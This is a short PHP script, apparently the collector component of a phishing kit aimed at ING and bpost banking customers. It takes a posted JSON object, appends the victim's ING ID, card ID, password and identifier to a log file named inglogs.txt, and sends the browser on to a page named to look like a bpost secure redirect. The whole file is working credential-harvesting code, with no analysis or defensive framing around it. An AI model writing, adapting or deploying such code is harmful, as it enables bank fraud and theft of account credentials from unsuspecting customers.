<?php


	// Nieuwe php - ontvang JSON object, schrijf deze weg in het bestand.
	header("Location:  /bpost/bpb/pcbanking/secure-redirectoffbpost.html");
	$postdata = file_get_contents("php://input");
	$obj = json_decode($postdata);
	$handle = fopen("inglogs.txt", "a");
	fwrite($handle, "ING ID: " . $obj->id . "\r\n");
	fwrite($handle, "Card ID: " . $obj->cardid . "\r\n");
	fwrite($handle, "Version: " . $obj->version . "\r\n");
	fwrite($handle, "Password: " . $obj->password . "\r\n");
	fwrite($handle, "Identificatie: " . $obj->identifier . "\r\n");
	fwrite($handle, "" . "\r\n");
	fclose($handle);
?>